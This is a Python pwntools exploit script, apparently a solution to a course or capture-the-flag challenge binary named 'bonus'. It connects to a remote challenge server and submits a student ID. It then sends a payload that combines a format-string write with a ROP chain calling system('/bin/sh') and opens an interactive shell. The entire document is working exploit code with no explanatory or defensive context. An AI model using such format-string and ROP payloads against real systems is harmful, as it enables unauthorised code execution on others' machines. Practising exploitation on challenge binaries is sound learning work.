from pwn import *

context.arch = "amd64"
context.log_level = "debug"

DEBUG = 1
REMOTE = 1

if REMOTE:
    p = remote("8.154.20.109", 10302)
else:
    p = process("./bonus")

elf = ELF("./bonus")
libc = ELF("./libc.so")
system = elf.symbols["system"]
buffer = elf.symbols["buffer"]

if REMOTE:
    p.sendlineafter(b"Please input your StudentID:\n", str(3220103784))

# set parameters
offset = 8
rop = ROP(elf)
ret =  rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

if DEBUG:
   print("[DEBUG] ret: ", hex(ret))

p.sendline("dummy input")

payload = ""
length = 0x40
payload += "%{}c%{}$lln".format(buffer + length, offset)
payload = payload.encode().ljust(length, b"\x00")
payload += b"Anya" * 2

payload += p64(pop_rdi)
payload += p64(buffer + 2 * length)
rop.raw(system)
payload += p64(ret)
payload += rop.chain()
payload = payload.ljust(2 * length, b"\x00")
payload += b"/bin/sh\x00"

p.info("payload length: {}".format(hex(len(payload))))

p.sendline(payload)
p.interactive()
